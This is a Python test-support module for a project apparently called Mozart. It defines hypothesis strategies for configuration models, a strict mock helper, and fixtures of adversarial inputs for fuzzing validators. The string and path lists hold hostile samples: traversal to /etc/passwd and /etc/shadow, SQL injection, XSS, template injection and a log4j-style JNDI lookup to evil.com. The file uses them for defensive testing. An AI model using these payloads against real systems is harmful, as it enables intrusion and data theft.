"""Adversarial testing infrastructure for Mozart.

Provides hypothesis profiles, Pydantic model strategies, adversarial input
generators, and strict mock helpers for comprehensive property-based testing.

Usage:
    Import fixtures and strategies into test modules::

        from tests.conftest_adversarial import (
            strict_mock,
            backend_config_strategy,
            ...
        )

    Or use pytest fixtures directly::

        def test_something(adversarial_strings, adversarial_ints):
            ...
"""

from __future__ import annotations

import sys
from typing import Any
from unittest.mock import create_autospec

import hypothesis.strategies as st
import pytest
from hypothesis import HealthCheck, settings

# ---------------------------------------------------------------------------
# 1. Hypothesis Profiles
# ---------------------------------------------------------------------------

settings.register_profile(
    "ci",
    max_examples=20,
    deadline=500,  # ms
    suppress_health_check=[HealthCheck.too_slow],
)

settings.register_profile(
    "nightly",
    max_examples=200,
    deadline=5000,  # ms
    suppress_health_check=[HealthCheck.too_slow],
)

# ---------------------------------------------------------------------------
# 2. Pydantic Model Strategies
# ---------------------------------------------------------------------------

# --- Primitive strategies for reuse ---

_nonneg_float = st.floats(min_value=0.0, max_value=1e6, allow_nan=False, allow_infinity=False)
_unit_float = st.floats(min_value=0.0, max_value=1.0, allow_nan=False, allow_infinity=False)
_positive_int = st.integers(min_value=1, max_value=10000)
_nonneg_int = st.integers(min_value=0, max_value=10000)
_short_text = st.text(min_size=1, max_size=100, alphabet=st.characters(categories=("L", "N", "P", "Z")))


# --- backend.py strategies ---

def backend_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for BackendConfig as a dict (to pass to model_validate)."""
    return st.fixed_dictionaries({
        "type": st.sampled_from(["claude_cli", "anthropic_api", "recursive_light", "ollama"]),
        "skip_permissions": st.booleans(),
        "disable_mcp": st.booleans(),
        "output_format": st.sampled_from(["json", "text", "stream-json"]),
        "timeout_seconds": st.floats(min_value=0.01, max_value=7200.0, allow_nan=False, allow_infinity=False),
        "model": _short_text,
        "temperature": _unit_float,
        "max_tokens": _positive_int,
    })


# --- execution.py strategies ---

def retry_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for RetryConfig as a dict."""
    return st.builds(
        lambda max_retries, base_delay, exponential_base, jitter, max_completion_attempts: {
            "max_retries": max_retries,
            "base_delay_seconds": base_delay,
            "max_delay_seconds": max(base_delay, base_delay * 10),  # ensure max >= base
            "exponential_base": exponential_base,
            "jitter": jitter,
            "max_completion_attempts": max_completion_attempts,
        },
        max_retries=st.integers(min_value=0, max_value=100),
        base_delay=st.floats(min_value=0.01, max_value=100.0, allow_nan=False, allow_infinity=False),
        exponential_base=st.floats(min_value=1.01, max_value=10.0, allow_nan=False, allow_infinity=False),
        jitter=st.booleans(),
        max_completion_attempts=st.integers(min_value=0, max_value=50),
    )


def rate_limit_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for RateLimitConfig as a dict."""
    return st.fixed_dictionaries({
        "detection_patterns": st.just([r"rate.?limit", r"429"]),
        "wait_minutes": st.integers(min_value=1, max_value=120),
        "max_waits": st.integers(min_value=1, max_value=100),
        "max_quota_waits": st.integers(min_value=1, max_value=200),
    })


def circuit_breaker_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for CircuitBreakerConfig as a dict."""
    return st.fixed_dictionaries({
        "enabled": st.booleans(),
        "failure_threshold": st.integers(min_value=1, max_value=100),
        "recovery_timeout_seconds": st.floats(
            min_value=0.01, max_value=3600.0, allow_nan=False, allow_infinity=False,
        ),
        "cross_workspace_coordination": st.booleans(),
    })


def cost_limit_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for CostLimitConfig as a dict.

    Generates both enabled and disabled configurations. When enabled,
    at least one limit is always set (model validator requirement).
    """
    return st.one_of(
        # Disabled config — no limits needed
        st.just({"enabled": False}),
        # Enabled config — must have at least one limit
        st.fixed_dictionaries({
            "enabled": st.just(True),
            "max_cost_per_sheet": st.floats(
                min_value=0.01, max_value=1000.0, allow_nan=False, allow_infinity=False,
            ),
            "max_cost_per_job": st.floats(
                min_value=0.01, max_value=10000.0, allow_nan=False, allow_infinity=False,
            ),
        }),
    )


def validation_rule_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for ValidationRule as a dict."""
    return st.one_of(
        st.fixed_dictionaries({
            "type": st.just("file_exists"),
            "path": st.just("{workspace}/output.txt"),
        }),
        st.fixed_dictionaries({
            "type": st.just("content_contains"),
            "path": st.just("{workspace}/output.txt"),
            "pattern": _short_text,
        }),
        st.fixed_dictionaries({
            "type": st.just("command_succeeds"),
            "command": st.just("echo ok"),
        }),
    )


def parallel_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for ParallelConfig as a dict.

    Note: budget_partition=False raises ValueError (not yet implemented),
    so we always use True.
    """
    return st.fixed_dictionaries({
        "enabled": st.booleans(),
        "max_concurrent": st.integers(min_value=1, max_value=10),
        "fail_fast": st.booleans(),
        "budget_partition": st.just(True),
    })


def stale_detection_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for StaleDetectionConfig as a dict."""
    return st.one_of(
        st.just({"enabled": False}),
        st.builds(
            lambda idle_timeout: {
                "enabled": True,
                "idle_timeout_seconds": idle_timeout,
                "check_interval_seconds": idle_timeout / 10,  # always < idle_timeout
            },
            idle_timeout=st.floats(
                min_value=10.0, max_value=3600.0, allow_nan=False, allow_infinity=False,
            ),
        ),
    )


def preflight_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for PreflightConfig as a dict."""
    return st.one_of(
        # Defaults
        st.just({}),
        # Disabled (both zero)
        st.just({"token_warning_threshold": 0, "token_error_threshold": 0}),
        # Custom thresholds (warning < error)
        st.builds(
            lambda warn: {
                "token_warning_threshold": warn,
                "token_error_threshold": warn * 3,  # always > warning
            },
            warn=st.integers(min_value=1_000, max_value=500_000),
        ),
    )


# --- job.py strategies ---

def sheet_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for SheetConfig as a dict."""
    return st.builds(
        lambda size, total_items: {
            "size": size,
            "total_items": total_items,
        },
        size=st.integers(min_value=1, max_value=100),
        total_items=st.integers(min_value=1, max_value=1000),
    )


def prompt_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for PromptConfig as a dict."""
    return st.one_of(
        st.fixed_dictionaries({
            "template": _short_text,
        }),
        st.fixed_dictionaries({
            "template": st.none(),
            "template_file": st.none(),
        }),
    )


# --- orchestration.py strategies ---

def conductor_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for ConductorConfig as a dict."""
    return st.fixed_dictionaries({
        "name": st.text(min_size=1, max_size=100, alphabet=st.characters(categories=("L", "N"))),
        "role": st.sampled_from(["human", "ai", "hybrid"]),
    })


def concert_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for ConcertConfig as a dict."""
    return st.fixed_dictionaries({
        "enabled": st.booleans(),
        "max_chain_depth": st.integers(min_value=1, max_value=100),
        "cooldown_between_jobs_seconds": _nonneg_float,
        "inherit_workspace": st.booleans(),
    })


# --- workspace.py strategies ---

def workspace_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for IsolationConfig (workspace isolation) as a dict."""
    return st.fixed_dictionaries({
        "enabled": st.booleans(),
        "mode": st.just("worktree"),
        "cleanup_on_success": st.booleans(),
        "cleanup_on_failure": st.booleans(),
        "fallback_on_error": st.booleans(),
    })


def log_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for LogConfig as a dict."""
    return st.one_of(
        st.fixed_dictionaries({
            "level": st.sampled_from(["DEBUG", "INFO", "WARNING", "ERROR"]),
            "format": st.sampled_from(["json", "console"]),
        }),
        st.fixed_dictionaries({
            "level": st.sampled_from(["DEBUG", "INFO", "WARNING", "ERROR"]),
            "format": st.just("both"),
            "file_path": st.just("/tmp/mozart-test.log"),
        }),
    )


def ai_review_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for AIReviewConfig as a dict."""
    return st.builds(
        lambda min_score, on_low_score: {
            "enabled": True,
            "min_score": min_score,
            "target_score": max(min_score, min_score + 10),  # target >= min
            "on_low_score": on_low_score,
        },
        min_score=st.integers(min_value=0, max_value=90),
        on_low_score=st.sampled_from(["retry", "warn", "fail"]),
    )


def feedback_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for FeedbackConfig as a dict."""
    return st.fixed_dictionaries({
        "enabled": st.booleans(),
        "format": st.sampled_from(["json", "yaml", "text"]),
    })


# --- checkpoint.py strategies ---

def sheet_state_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for SheetState as a dict."""
    return st.fixed_dictionaries({
        "sheet_num": _positive_int,
        "status": st.sampled_from(["pending", "in_progress", "completed", "failed", "skipped"]),
        "attempt_count": _nonneg_int,
    })


def checkpoint_state_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for CheckpointState as a dict (minimal required fields)."""
    return st.fixed_dictionaries({
        "job_id": st.text(min_size=1, max_size=50, alphabet=st.characters(categories=("L", "N"))),
        "job_name": st.text(min_size=1, max_size=100, alphabet=st.characters(categories=("L", "N"))),
        "total_sheets": _positive_int,
    })


# --- learning.py strategies ---

def learning_config_strategy() -> st.SearchStrategy[dict[str, Any]]:
    """Strategy for LearningConfig as a dict."""
    return st.builds(
        lambda min_conf, exploration_rate: {
            "enabled": True,
            "min_confidence_threshold": min_conf,
            "high_confidence_threshold": min(min_conf + 0.3, 1.0),  # always > min
            "exploration_rate": exploration_rate,
        },
        min_conf=st.floats(min_value=0.0, max_value=0.5, allow_nan=False, allow_infinity=False),
        exploration_rate=_unit_float,
    )


# ---------------------------------------------------------------------------
# 3. Adversarial Input Generators (Fixtures)
# ---------------------------------------------------------------------------

_ADVERSARIAL_STRINGS: list[str] = [
    "",                                             # empty
    "\x00",                                         # null byte
    "\x00\x00\x00",                                 # multiple null bytes
    "\U0001f600\U0001f4a9\U0001f525",               # emoji
    "\u200b\u200c\u200d\ufeff",                     # zero-width chars
    "\u202e\u0645\u0631\u062d\u0628\u0627",         # RTL override + Arabic
    "../../etc/passwd",                              # path traversal
    "../../../../../../../etc/shadow",               # deep path traversal
    "'; DROP TABLE sheets;--",                       # SQL injection
    "<script>alert('xss')</script>",                 # XSS
    "{{7*7}}",                                       # template injection
    "${jndi:ldap://evil.com/a}",                     # log4j style
    "A" * 10240,                                     # very long string (10KB)
    "   \t\n\r  ",                                   # only whitespace
    "\n\n\n",                                        # only newlines
    "null",                                          # literal "null"
    "undefined",                                     # literal "undefined"
    "true",                                          # literal "true"
    "NaN",                                           # literal "NaN"
    "-1",                                            # negative number string
    "0",                                             # zero string
    "/",                                             # root path
    "\\\\server\\share",                             # UNC path
    "CON",                                           # Windows reserved name
    "a" * 256,                                       # max filename length
]

_ADVERSARIAL_INTS: list[int] = [
    0,
    -1,
    -sys.maxsize,
    sys.maxsize,
    1,
    -2147483648,    # INT32_MIN
    2147483647,     # INT32_MAX
    -(2**63),       # INT64_MIN approx
    2**63 - 1,      # INT64_MAX approx
]

_ADVERSARIAL_PATHS: list[str] = [
    "",                                      # empty
    "/",                                     # root
    "..",                                    # parent
    "../..",                                 # grandparent
    "/tmp/test file with spaces",            # spaces
    "/tmp/tëst-üñîcödé",                     # unicode
    "/tmp/\x00hidden",                       # null byte in path
    "relative/path",                         # relative
    "/absolute/path",                        # absolute
    "~/.config/secret",                      # home-relative
    "/proc/self/exe",                        # symlink target (Linux)
    "/dev/null",                             # device file
    "C:\\Windows\\System32",                 # Windows absolute
    "/tmp/" + "a" * 255,                     # max component length
    "/tmp/file\nwith\nnewlines",             # newlines in path
]


@pytest.fixture
def adversarial_strings() -> list[str]:
    """Adversarial string inputs for fuzzing parsers and validators."""
    return list(_ADVERSARIAL_STRINGS)


@pytest.fixture
def adversarial_ints() -> list[int]:
    """Adversarial integer inputs for boundary testing."""
    return list(_ADVERSARIAL_INTS)


@pytest.fixture
def adversarial_paths() -> list[str]:
    """Adversarial filesystem path inputs for path-handling code."""
    return list(_ADVERSARIAL_PATHS)


# ---------------------------------------------------------------------------
# 4. Strict Mock Helper
# ---------------------------------------------------------------------------

def strict_mock(spec_class: type, **kwargs: Any) -> Any:
    """Create a strict mock that raises ``AttributeError`` on unexpected access.

    Wraps :func:`unittest.mock.create_autospec` with ``instance=True`` to
    produce a mock that:

    - Only allows attributes and methods defined on ``spec_class``
    - Enforces call signatures (wrong arg counts raise ``TypeError``)
    - Returns ``MagicMock`` instances for defined methods (spec-constrained)

    This is preferred over bare ``MagicMock()`` because:

    1. Bare mocks silently succeed on *any* attribute access, which means
       tests pass even when the production code calls a method that doesn't
       exist on the real class. ``create_autospec`` raises ``AttributeError``
       for undefined attributes, catching interface drift.

    2. Bare mocks don't enforce call signatures, so tests can call
       ``mock.some_method(wrong, args)`` without failure.

    Args:
        spec_class: The class to spec against.
        **kwargs: Additional keyword arguments passed to ``create_autospec``.

    Returns:
        A spec-constrained mock instance of ``spec_class``.

    Example::

        from tests.conftest_adversarial import strict_mock
        from marianne.core.checkpoint import CheckpointState

        mock_state = strict_mock(CheckpointState)
        mock_state.job_id = "test-123"
        mock_state.nonexistent_attr  # raises AttributeError
    """
    return create_autospec(spec_class, instance=True, **kwargs)
